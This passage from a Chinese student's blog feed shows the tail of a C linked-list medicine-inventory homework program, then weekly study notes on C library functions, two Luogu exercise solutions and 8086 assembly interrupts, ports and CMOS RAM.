class="literal">NULL</span>) &#123;</span><br><span class="line">			head=head-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"顺序输入药品的：编码  名称 价格 药品类型（处方药/非处方药） 生产日期（年） 保质期（年） 库存，-1结束\n"</span>);</span><br><span class="line">	nextp=(struct med*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct med));</span><br><span class="line">	nextp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;nextp-&gt;elecode);</span><br><span class="line">	<span class="keyword">while</span>(nextp-&gt;elecode!=<span class="number">-1</span>) &#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%s %lf %s %d %d %d"</span>,nextp-&gt;name,&amp;nextp-&gt;price,nextp-&gt;type,&amp;nextp-&gt;prod,&amp;nextp-&gt;shelf,&amp;nextp-&gt;stock);</span><br><span class="line">		<span class="keyword">if</span>(head==<span class="literal">NULL</span>) &#123;</span><br><span class="line">			p=nextp;</span><br><span class="line">			head=p;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			head-&gt;next=nextp;</span><br><span class="line">			head=head-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		nextp=(struct med*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct med));</span><br><span class="line">		nextp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;nextp-&gt;elecode);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"成功录入,按回车返回"</span>);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">	system(<span class="string">"cls"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(struct med *p)</span> </span>&#123;	</span><br><span class="line">	system(<span class="string">"cls"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"编码     名称   价格    药品类型 生产日期（年） 保质期（年） 库存\n"</span>);</span><br><span class="line">	<span class="keyword">while</span>(p) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d     %s     %.2lf %5s %10d %10d %14d\n"</span>,p-&gt;elecode,p-&gt;name,p-&gt;price,p-&gt;type,p-&gt;prod,p-&gt;shelf,p-&gt;stock);</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sum</span><span class="params">(struct med *p)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(p) &#123;</span><br><span class="line">		sum+=p-&gt;stock;</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"药品种类：%d\n药品总量：%d"</span>,i,sum);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">	system(<span class="string">"cls"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//组合查询：stock&gt;10的</span></span><br><span class="line"><span class="comment">//单项查询：按编码  按价格区间</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find</span><span class="params">(struct med *p)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"选择查询内容：\n1.库存小于10或可能在一年内过期的药\n2.按编码查询\n3.按价格区间查询\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="keyword">int</span> num;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;num);</span><br><span class="line">	<span class="keyword">if</span>(num==<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"今年是__年：    "</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"编码     名称   价格    药品类型 生产日期（年） 保质期（年） 库存\n"</span>);</span><br><span class="line">		<span class="keyword">while</span>(p) &#123;</span><br><span class="line">			<span class="keyword">if</span>(p-&gt;stock&lt;<span class="number">10</span>||p-&gt;shelf-n&lt;<span class="number">2</span>)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"%d     %s     %.2lf %5s %10d %10d %14d\n"</span>,p-&gt;elecode,p-&gt;name,p-&gt;price,p-&gt;type,p-&gt;prod,p-&gt;shelf,p-&gt;stock);</span><br><span class="line">				<span class="comment">//printf("%d %s %lf %s %d %d %d\n",p-&gt;elecode,p-&gt;name,p-&gt;price,p-&gt;type,p-&gt;prod,p-&gt;shelf,p-&gt;stock);</span></span><br><span class="line">			p=p-&gt;next; </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(num==<span class="number">2</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"输入编码：   "</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"名称   价格    药品类型 生产日期（年） 保质期（年） 库存\n"</span>);</span><br><span class="line">		<span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(p-&gt;elecode==n) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			p=p-&gt;next;</span><br><span class="line">			<span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(p!=<span class="literal">NULL</span>)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%s     %.2lf %5s %10d %10d %14d\n"</span>,p-&gt;name,p-&gt;price,p-&gt;type,p-&gt;prod,p-&gt;shelf,p-&gt;stock);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"Wrong Number\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(num==<span class="number">3</span>) &#123;</span><br><span class="line">		<span class="keyword">int</span> <span class="built_in">min</span>,<span class="built_in">max</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"输入最低和最高价格，以空格分开：    "</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;<span class="built_in">min</span>,&amp;<span class="built_in">max</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"编码     名称   价格    药品类型 生产日期（年） 保质期（年） 库存\n"</span>);</span><br><span class="line">		<span class="keyword">while</span>(p) &#123;</span><br><span class="line">			<span class="keyword">if</span>(p-&gt;price&gt;=<span class="built_in">min</span>&amp;&amp;p-&gt;price&lt;=<span class="built_in">max</span>)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"%d     %s     %.2lf %5s %10d %10d %14d\n"</span>,p-&gt;elecode,p-&gt;name,p-&gt;price,p-&gt;type,p-&gt;prod,p-&gt;shelf,p-&gt;stock);</span><br><span class="line">			p=p-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"错误的选项\n"</span>);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">	system(<span class="string">"cls"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify</span><span class="params">(struct med *p)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> num;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"输入修改药品的编码:\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;num);</span><br><span class="line">	<span class="keyword">while</span>(p) &#123;</span><br><span class="line">		<span class="keyword">if</span>(p-&gt;elecode!=num) &#123;</span><br><span class="line">			p=p-&gt;next;</span><br><span class="line">		&#125; <span class="keyword">else</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"编码错误"</span>);</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"输入修改药品信息:\n"</span>);	</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"顺序输入药品的：名称 价格 药品类型（处方药/非处方药） 生产日期（年） 保质期（年） 库存\n"</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%s %lf %s %d %d %d"</span>,p-&gt;name,&amp;p-&gt;price,p-&gt;type,&amp;p-&gt;prod,&amp;p-&gt;shelf,&amp;p-&gt;stock);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"成功修改\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">system(<span class="string">"pause"</span>);</span><br><span class="line">	system(<span class="string">"cls"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"输入删除药品编码："</span>);</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">med</span> *<span class="title">head</span>,*<span class="title">nextp</span>,*<span class="title">d</span>;</span></span><br><span class="line">	head=p;</span><br><span class="line">	nextp=p;</span><br><span class="line">	<span class="keyword">if</span>(head-&gt;elecode==n) &#123;</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">		<span class="built_in">free</span>(head);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"成功删除"</span>);</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">	head=head-&gt;next;</span><br><span class="line">		<span class="keyword">while</span>(head) &#123;</span><br><span class="line">			<span class="keyword">if</span>(head-&gt;elecode!=n) &#123;</span><br><span class="line">				head=head-&gt;next;</span><br><span class="line">				nextp=nextp-&gt;next;</span><br><span class="line">			&#125; <span class="keyword">else</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(head==<span class="literal">NULL</span>)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"错误编码"</span>);</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			</span><br><span class="line">			nextp-&gt;next=head-&gt;next;</span><br><span class="line">			<span class="built_in">free</span>(head);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"成功删除"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	getchar();</span><br><span class="line">	getchar();</span><br><span class="line">	system(<span class="string">"cls"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">(struct med *p)</span> </span>&#123;</span><br><span class="line">	FILE* fp;</span><br><span class="line">	fp = fopen(<span class="string">".\\medinfo.txt"</span>, <span class="string">"w"</span>);</span><br><span class="line">	<span class="keyword">while</span> (p) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(fp,<span class="string">"%d %s %.2lf %s %d %d %d\n"</span>,p-&gt;elecode,p-&gt;name,p-&gt;price,p-&gt;type,p-&gt;prod,p-&gt;shelf,p-&gt;stock);</span><br><span class="line"></span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(fp);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"保存成功\n"</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	getchar();</span><br><span class="line">	system(<span class="string">"cls"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(p!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">med</span> *<span class="title">nextp</span>=<span class="title">p</span>-&gt;<span class="title">next</span>;</span></span><br><span class="line">		<span class="built_in">free</span>(p);</span><br><span class="line">		<span class="keyword">while</span>(nextp) &#123;</span><br><span class="line">			p=nextp;</span><br><span class="line">			nextp=nextp-&gt;next;</span><br><span class="line">			<span class="built_in">free</span>(p);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	FILE *fp;</span><br><span class="line">	fp=fopen(<span class="string">".\\medinfo.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">	<span class="keyword">if</span>(fp==<span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"文件无法打开"</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		struct med *nextp,*head;</span><br><span class="line">		head=<span class="literal">NULL</span>;</span><br><span class="line">		nextp=(struct med*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct med));</span><br><span class="line">		nextp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">while</span>(<span class="built_in">fscanf</span>(fp,<span class="string">"%d"</span>,&amp;nextp-&gt;elecode)==<span class="number">1</span>) &#123;</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">"%s"</span>,nextp-&gt;name);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">"%lf"</span>,&amp;nextp-&gt;price);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">"%s"</span>,&amp;nextp-&gt;type);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">"%d"</span>,&amp;nextp-&gt;prod);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">"%d"</span>,&amp;nextp-&gt;shelf);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">"%d"</span>,&amp;nextp-&gt;stock);</span><br><span class="line">			<span class="keyword">if</span>(head==<span class="literal">NULL</span>) &#123;</span><br><span class="line">				head=nextp;</span><br><span class="line">				p=head;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				head-&gt;next=nextp;</span><br><span class="line">				head=head-&gt;next;</span><br><span class="line">			&#125;</span><br><span class="line">			nextp=(struct med*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct med));</span><br><span class="line">			nextp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		fclose(fp);</span><br><span class="line">	&#125;</span><br><span class="line">	getchar();</span><br><span class="line">	getchar();</span><br><span class="line">	system(<span class="string">"cls"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <tags>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.02.17-2020.02.23</title>
    <url>/12995.html</url>
    <content><![CDATA[<h1 id="洛谷"><a href="#洛谷" class="headerlink" title="洛谷"></a>洛谷</h1><h2 id="函数整理"><a href="#函数整理" class="headerlink" title="函数整理"></a>函数整理</h2><h3 id="memset"><a href="#memset" class="headerlink" title="memset"></a>memset</h3><p>memset(数组名或指针，值，大小)<br>可用于数组初始化<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">....</span><br><span class="line"><span class="keyword">int</span> a[n];</span><br><span class="line"><span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="keyword">sizeof</span>(a));</span><br><span class="line">....</span><br></pre></td></tr></table></figure><br><a id="more"></a></p>
<h3 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf"></a>sprintf</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(<span class="keyword">char</span> *str, <span class="keyword">char</span> * format [, argument, ...]);</span><br></pre></td></tr></table></figure>
<p>str为要写入的字符串；format为格式化字符串，与printf()函数相同；argument为变量。<br>可用于把整数搞进字符串<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(s, <span class="string">"%8x"</span>, <span class="number">4567</span>);  <span class="comment">//小写16进制，宽度占8个位置，右对齐，保存在s中</span></span><br></pre></td></tr></table></figure><br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">....</span><br><span class="line"><span class="keyword">char</span> a = <span class="string">'a'</span>;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">80</span>];</span><br><span class="line"><span class="built_in">sprintf</span>(buf, <span class="string">"The ASCII code of a is %d."</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>, buf);</span><br><span class="line">....</span><br></pre></td></tr></table></figure><br>sprintf不检测数组长度，容易造成缓冲区溢出，可用snprintf()代替</p>
<h2 id="题"><a href="#题" class="headerlink" title="题"></a>题</h2><h3 id="P1031-均分纸牌"><a href="#P1031-均分纸牌" class="headerlink" title="P1031 均分纸牌"></a>P1031 均分纸牌</h3><p><img src="https://s2.ax1x.com/2020/02/23/3llMYn.md.png" alt=" "></p>
<p>&emsp;<br>没啥思路就看了题解:<br><img src="https://s2.ax1x.com/2020/02/23/3llnoj.png" alt=""><br>得到代码：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">	<span class="keyword">int</span> a[n];</span><br><span class="line">	<span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</span><br><span class="line">		sum+=a[i];</span><br><span class="line">	&#125;</span><br><span class="line">	sum=sum/n;</span><br><span class="line">    <span class="comment">//均分过程：</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(a[i]-sum!=<span class="number">0</span>)&#123;</span><br><span class="line">			a[i+<span class="number">1</span>]+=a[i]-sum,</span><br><span class="line">			cnt++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d"</span>,cnt);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="P1548-棋盘问题"><a href="#P1548-棋盘问题" class="headerlink" title="P1548 棋盘问题"></a>P1548 棋盘问题</h3><p><img src="https://s2.ax1x.com/2020/02/23/3llKFs.png" alt=" "></p>
<p>&emsp;<br>思路：只会枚举<br><img src="https://s2.ax1x.com/2020/02/23/3lleeg.md.png" alt=""><br>(突然发现多弄了一个点上去….)<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n,m;</span><br><span class="line">	<span class="keyword">int</span> rectangle=<span class="number">0</span>,square=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;n,&amp;m);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> a=<span class="number">0</span>;a&lt;m+<span class="number">1</span>;a++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> b=<span class="number">0</span>;b&lt;n+<span class="number">1</span>;b++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> x=a+<span class="number">1</span>;x&lt;m+<span class="number">1</span>;x++)&#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">int</span> y=b+<span class="number">1</span>;y&lt;n+<span class="number">1</span>;y++)&#123;</span><br><span class="line">					<span class="keyword">if</span>(a-x==b-y)</span><br><span class="line">						square++;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">						rectangle++;</span><br><span class="line">						</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d %d"</span>,square,rectangle);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="汇编学习"><a href="#汇编学习" class="headerlink" title="汇编学习"></a>汇编学习</h1><h3 id="中断过程"><a href="#中断过程" class="headerlink" title="中断过程"></a>中断过程</h3><p>cpu的硬件自动完成：用中断类型码找到中断向量，并用它设置cs和ip&emsp;这个工作的过程<br>cpu在完成中断处理程序后，返回原来的执行点继续执行下面的指令。所以在设置cs:ip之前，还要将原来的cs和ip的值保存起来（同样，在使用call指令时也先保存当前cs和ip的值，再设置cs和ip）<br>8086cpu收到中断信息后引发的中断过程：  </p>
<ol>
<li>取得中断类型码</li>
<li>标志寄存器入栈</li>
<li>设置标志寄存器TF和IF值位0</li>
<li>cs内容入栈</li>
<li>ip内容入栈</li>
<li>从内存地址为中断类型码 <em>4和中断类型码 </em>4+2的两个字单元中读取中断处理程序的入口设置为cs和ip  </li>
</ol>
<p>即：</p>
<ol>
<li>取得中断类型码N</li>
<li>pushf</li>
<li>TF=0,IF=0</li>
<li>push cs</li>
<li>push ip</li>
<li>(ip)=(N<em> 4),(cs)=(N</em> 4+2)</li>
</ol>
<h3 id="中断处理程序和iret指令"><a href="#中断处理程序和iret指令" class="headerlink" title="中断处理程序和iret指令"></a>中断处理程序和iret指令</h3><p>由于cpu随时都可能检测到中断信息，随时都可能执行中断处理程序，所以中断处理程序必须一直储存在内存某段空间之中。<br>中断处理程序的编写步骤：  </p>
<ol>
<li>保存用到的寄存器</li>
<li>处理中断</li>
<li>恢复用到的寄存器</li>
<li>用iret指令返回</li>
</ol>
<p>iret指令：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pop ip</span><br><span class="line">pop cs</span><br><span class="line">popf</span><br></pre></td></tr></table></figure><br>&emsp;  </p>
<p>8086支持256个中断，但系统中要处理的中断事件没有达到256个，所以在中断向量表中，许多单元都是空的  </p>
<h3 id="单步中断"><a href="#单步中断" class="headerlink" title="单步中断"></a>单步中断</h3><p>cpu在执行完一条指令后，如果检测到标志寄存器的TF位为1，则产生单步中断<br>引发中断过程：</p>
<ol>
<li>取得中断类型码1</li>
<li>标志寄存器入栈，TF、IF设置为0  <h1 id="否则cpu永远只能执行单步中断处理程序的第一条指令"><a href="#否则cpu永远只能执行单步中断处理程序的第一条指令" class="headerlink" title="否则cpu永远只能执行单步中断处理程序的第一条指令"></a>否则cpu永远只能执行单步中断处理程序的第一条指令</h1></li>
<li>cs、ip 入栈</li>
<li>(ip)=(1<em> 4),(cs)=(1</em> 4+2)  </li>
</ol>
<p>如果cpu不提供其他功能，只要cpu一加电，它就从预设的地方自动向下一直读取指令执行<br>debug利用了cpu提供的功能，在使用T命令时，debug将TF设置为1<br>cpu提供单步中断功能的原因：单步跟踪程序的执行过程  </p>
<p>IF：中断允许标志位。控制cpu是否允许接收外部中断请求。若IF=1，8086能响应外部中断  </p>
<h3 id="响应中断的特殊情况"><a href="#响应中断的特殊情况" class="headerlink" title="响应中断的特殊情况"></a>响应中断的特殊情况</h3><p>如：</p>
<blockquote>
<p>在执行完向ss寄存器传送数据的指令后，即使发生中断，cpu也不会响应<br>（<a href="https://brubbish.github.io/19661.html）">https://brubbish.github.io/19661.html）</a></p>
</blockquote>
<p>如果在执行完设置ss的指令后 cpu响应中断，需要在栈中压入标志寄存器、cs和ip的值。而ss改变，sp未改变，ss：sp指向错误的栈顶，将引起错误。</p>
<p>应该利用这个特性，将设置ss和sp的指令连续存放</p>
<h3 id="int指令"><a href="#int指令" class="headerlink" title="int指令"></a>int指令</h3><p>cpu执行int n 指令，相当于引发一个n号中断的过程：</p>
<ol>
<li>取中断类型码n</li>
<li>标志寄存器入栈，IF=0,TF=0</li>
<li>cs、ip 入栈</li>
<li>(ip)=(n <em>4), (cs)=(n </em>4+4)</li>
</ol>
<p>int 指令的最终功能与call指令相似，都是调用一段程序</p>
<h3 id="DOS中-断例程应用-中断例程"><a href="#DOS中-断例程应用-中断例程" class="headerlink" title="DOS中 断例程应用(中断例程)"></a>DOS中 断例程应用(中断例程)</h3><p>int 21h 中断例程是dos提供的中断例程  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure>
<p>是int 21h中断例程的4ch号功能等同于：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ah,4h       ;程序返回</span><br><span class="line">mov al,0        ;返回值</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure><br>(ah)=4ch代表调用第21h号中断例程的4ch号子程序</p>
<h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><p>各种存储器都和cpu的地址线、数据线、控制线相连。cpu在操作它们的时候，把他们都当作内存对待，把它们总的看做一个由若干存储单元组成的逻辑存储器（内存地址空间）<br>和cpu通过总线相连的芯片除了存储器外，还有：  </p>
<ol>
<li>接口卡上的接口芯片  </li>
<li>主板上的接口芯片，cpu通过它们对部分外部设备进行访问</li>
<li>其他芯片</li>
</ol>
<p>在这些芯片中，都有一组可由cpu读写的寄存器，这些寄存器通过芯片和cpu的总线相连。cpu将这些寄存器当作端口，对它们进行统一编址，从而建立了统一的端口地址空间。  </p>
<p>cpu可以直接读写：cpu内部寄存器、内存单元、端口 的数据  </p>
<h3 id="端口的读写"><a href="#端口的读写" class="headerlink" title="端口的读写"></a>端口的读写</h3><p>cpu最多可以定位64kb个不同的端口，端口地址范围为：0~65535<br>端口的读写指令只有  in（从端口读取）和out（往端口写入)<br>在in和out指令中，只能使用ax或al来存放读入或发送的数据。8位端口用al，16位端口用ax<br>对0~255的端口进行读写时：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">in al,20h</span><br><span class="line">out 20h,al</span><br></pre></td></tr></table></figure><br>对255~65535的端口进行读写时端口号放在dx中：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov dx,3f8h</span><br><span class="line">in al,dx</span><br><span class="line">out dx,al</span><br></pre></td></tr></table></figure></p>
<h3 id="CMOS-RAM芯片"><a href="#CMOS-RAM芯片" class="headerlink" title="CMOS RAM芯片"></a>CMOS RAM芯片</h3><p>包含一个实时钟和128个字节的ram存储器<br>由电池供电，关机后仍然工作，ram中信息不丢失<br>一部分单元保存时间信息，其余大部分单元保存系统配置信息<br>有两个端口，70h为地址端口，71h为数据端口</p>
<h2 id="shl和shr指令"><a href="#shl和shr指令" class="headerlink" title="shl和shr指令"></a>shl和shr指令</h2><p>shl是逻辑左移指令，移出的最后一位写入cf中<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov al,01001000</span><br><span class="line">shl al,1          ;将al中的数据左移一位</span><br></pre></td></tr></table></figure><br>执行后(al)=10010000, cf=0</p>
<p>移动位数大于1时，将移动位数放在cl中<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov al,01001000</span><br><span class="line">mov cl,3</span><br><span class="line">shl al,cl</span><br></pre></td></tr></table></figure><br>&emsp;<br>shr是逻辑右移指令，移出的最后一位写入cf中</p>
<p>左移一位相当于X=X*2,右移一位相当于X=X/2</p>
<h3 id="CMOS-RAM中储存的时间信息"><a href="#CMOS-RAM中储存的时间信息" class="headerlink" title="CMOS RAM中储存的时间信息"></a>CMOS RAM中储存的时间信息</h3><p>CMOS RAM中存放着年月日时分秒，这六个信息长度都为一个字节，以BCD码的方式存放。  </p>
<h4 id="BCD码"><a href="#BCD码" class="headerlink" title="BCD码"></a>BCD码</h4><p>以四位二进制数表示十进制数的编码方式<br>一个字节可以表示两个BCD码，高4位表示十位，低4位表示个位  </p>
<h2 id="外中断"><a href="#外中断" class="headerlink" title="外中断"></a>外中断</h2><p>及时处理外设的输入需要解决：1.cpu如何得知外设输入的时间&emsp;2.cpu从何处得到外设的输入</p>
